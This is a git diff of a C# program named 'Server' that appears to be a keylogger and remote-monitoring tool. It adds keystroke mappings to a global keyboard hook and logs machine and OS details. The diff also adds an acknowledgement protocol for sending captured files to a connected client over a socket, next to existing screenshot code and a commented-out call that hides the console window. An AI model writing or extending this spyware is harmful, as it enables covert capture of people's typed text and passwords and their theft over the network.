@@ -13,14 +13,15 @@ using System.Collections.Generic;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.Threading.Tasks;
-using constantsLib;
+using ConstantsLib;
 
 
 //TODO
 //1) chANGE layoutname to culture
 //2) control + special symb
 //3)encrypt
-namespace ConsoleApplication1
+//4) when client disconnect without quit kill service routine task
+namespace Server
 {
 
     class Program
@@ -86,6 +87,8 @@ namespace ConsoleApplication1
             // Hide
             IntPtr winPtr = GetConsoleWindow();
             //ShowWindow(winPtr, Constants.SW_HIDE);
+            File.Delete(Environment.CurrentDirectory + Constants.LogPath);//delete prev log for better debug
+
 
             FillDictionary();
             hookPtr = SetHook(hookProcedure);
@@ -102,6 +105,7 @@ namespace ConsoleApplication1
 
         private static void LogEnvironmentAndUserStat()
         {
+            Log(String.Format(Constants.UnderscoreLine));
             Log(String.Format("CurrentDirectory: {0}\r\n", Environment.CurrentDirectory));
             Log(String.Format("MachineName: {0}\r\n", Environment.MachineName));
             Log(String.Format("OSVersion: {0}\r\n", Environment.OSVersion.ToString()));
@@ -115,6 +119,7 @@ namespace ConsoleApplication1
                 Log(" " + lang.LayoutName);
             Log("\r\n");
             Log(String.Format("Layout: {0}\r\n", inputLanguage.LayoutName));
+            Log(String.Format(Constants.UnderscoreLine));
         }
         
         public static void Screenshot()
@@ -165,6 +170,54 @@ namespace ConsoleApplication1
                         break;
                     case ("Space"):
                         Presentation = " ";
+                        break;
+                    case ("OemPeriod"):
+                        Presentation = ".";
+                        break;
+                    case ("Oemcomma"):
+                        Presentation = ",";
+                        break;
+                    case ("Back"):
+                        Presentation = "←";
+                        break;
+                    case ("Oem5"):
+                        Presentation = "\\";
+                        break;
+                    case ("Divide"):
+                        Presentation = "/";
+                        break;
+                    case ("CapsLock"):
+                        Presentation = "{CAPSLOCK}";
+                        break;
+                    case ("Capital"):
+                        Presentation = "{CAPSLOCK}";
+                        break;
+                    case ("Tab"):
+                        Presentation = "{TAB}";
+                        break;
+                    case ("Oem1"):
+                        Presentation = ";";
+                        break;
+                    case ("OemQuestion"):
+                        Presentation = "?";
+                        break;
+                    case ("Назад"):
+                        Presentation = "←";
+                        break;
+                    case ("OemSemicolon"):
+                        Presentation = ";";
+                        break;
+                    case ("Oemtilde"):
+                        Presentation = "~";
+                        break;
+                    case ("PrintScreen"):
+                        Presentation = "{PrintScreen}";
+                        break;
+                    case ("Delete"):
+                        Presentation = "←";
+                        break;
+                    case ("Alt"):
+                        Presentation = "{ALT}";
                         break;
                     default:
                         Presentation = "";
@@ -384,6 +437,7 @@ namespace ConsoleApplication1
                 catch (Exception ex)
                 {
                     Console.Write(ex.Message);
+                    SendAcknowledgement(Constants.ACK_ERROR, clientSocket);
                     SendReply(ex.Message, clientSocket);
                 }
             }
@@ -401,16 +455,32 @@ namespace ConsoleApplication1
             fileNameLenBytes.CopyTo(sendBuf, 0);
             fileNameBytes.CopyTo(sendBuf, sizeof(int));
             fileContentLen.CopyTo(sendBuf, sizeof(int) + fileNameBytes.Length);
-            client.Send(sendBuf, sizeof(int) + fileNameBytes.Length + sizeof(int), SocketFlags.None);
 
-            fileContent.CopyTo(sendBuf, 0);
-            client.Send(sendBuf, fileContent.Length, SocketFlags.None);
-            Console.WriteLine("File:{0} has been sent.", filePath);
+            SendAcknowledgement(Constants.ACK_OK, client);
+            client.Send(sendBuf, sizeof(int) + fileNameBytes.Length + sizeof(int), SocketFlags.None);
+            if (GetAcknowlegment(client) == Constants.ACK_OK)
+            {
+                fileContent.CopyTo(sendBuf, 0);//отпрравляет сразу и служебную инфу и контент а клиент думает что это только служебная
+                client.Send(sendBuf, fileContent.Length, SocketFlags.None);
+                Console.WriteLine("File:{0} has been sent.", filePath);
+            }
+        }
+
+        public static void SendAcknowledgement(int ACK, Socket socket)
+        {
+            socket.Send(BitConverter.GetBytes(ACK));
+        }
+
+        public static int GetAcknowlegment(Socket socket)
+        {
+            byte[] buf = new byte[sizeof(int)];
+            socket.Receive(buf, sizeof(int), SocketFlags.None);
+            return BitConverter.ToInt32(buf, 0);
         }
 
         public static void Log(string inputstring)
         {
-            StreamWriter sw = new StreamWriter(Application.StartupPath + Constants.LogPath);
+            StreamWriter sw = new StreamWriter(Application.StartupPath + ConstantsLib.Constants.LogPath, true);
             sw.Write(inputstring);
             sw.Flush();
             sw.Close();
